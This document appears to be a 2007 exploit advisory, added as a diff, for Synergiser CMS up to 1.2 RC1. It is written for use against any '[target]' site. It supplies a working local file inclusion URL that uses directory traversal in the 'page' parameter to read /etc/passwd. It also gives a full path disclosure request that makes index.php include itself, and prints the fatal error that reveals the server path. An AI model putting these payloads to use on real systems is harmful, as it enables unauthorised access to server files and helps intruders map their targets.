@@ -1,0 +1,54 @@
+---------------------------------------------------------------
+ ____            __________         __             ____  __   
+/_   | ____     |__\_____  \  _____/  |_          /_   |/  |_ 
+ |   |/    \    |  | _(__  <_/ ___\   __\  ______  |   \   __\
+ |   |   |  \   |  |/       \  \___|  |   /_____/  |   ||  |  
+ |___|___|  /\__|  /______  /\___  >__|            |___||__|  
+          \/\______|      \/     \/                         
+---------------------------------------------------------------
+
+Http://www.inj3ct-it.org 	     Staff[at]inj3ct-it[dot]org 
+
+---------------------------------------------------------------
+
+Synergiser <= 1.2 RC1 Local File Inclusion & Full path disclosure
+Download: http://sourceforge.net/project/downloading.php?
+group_id=169910&use_mirror=kent&filename=synergiser-1.13_final.tar.gz&53405269
+---------------------------------------------------------------
+
+#By KiNgOfThEwOrLd
+
+---------------------------------------------------------------
+Local File Inclusion PoC:
+
+Synergiser cms allows to include a file by the get variabile "page". We can't 
+include a remote file, coz there is a filter..but we can include, by a 
+directory traversal, some important files...for example:
+
+http://[target]/[synergiser_path]/index.php?page=../../../etc/passwd
+---------------------------------------------------------------
+Full Path Disclosure PoC:
+
+So, we have to know the script path if we wanna browse the server...we can get 
+it generating a full path disclosure, like this:
+
+http://[target]/[synergiser_path]/index.php?page=../index.php
+
+We know that a function cannot be declared two times. So, let's read the 
+"index.php" code, and we will found:
+
+include('application_top.php');
+
+This row includes "application_top.php". In that page, is declared a php 
+function: assign_rand_value(); So, including index.php in index.php, we will 
+reinclude application_top.php, and we will redeclare the same function. We 
+can't do it! So the server will answer:
+
+Fatal error: Cannot redeclare assign_rand_value() (previously declared in 
+[script_path]/application_top.php:9) in [script_path]/application_top.php on 
+line 124
+
+And we got the script path! :P
+---------------------------------------------------------------
+
+# milw0rm.com [2007-11-02]
